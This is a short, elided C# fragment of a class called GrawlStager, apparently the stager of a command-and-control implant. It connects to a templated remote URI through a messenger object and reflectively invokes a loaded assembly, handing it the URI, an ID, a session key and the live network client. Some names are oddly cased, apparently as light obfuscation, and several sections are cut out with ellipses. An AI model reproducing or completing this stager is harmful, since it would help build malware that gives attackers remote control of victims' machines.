...
namespace GrawlStager
{
    public class GrawlStager
    {
		...
		public void ExecLevel()
        {
            try
            {
                string EasyPeasyURI = @"{{REP_EASYPEASY_URI}}";
                ...
                BridgeMessenger meSsenGer = new BridgeMessenger(EasyPeasyURI, ANOTHERID, ProfileWriteFormat);
				meSsenGer.Connect();
                ...
                grawlAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { EasyPeasyURI, ANOTHERID, SessKEy, meSsenGer.client });
            }
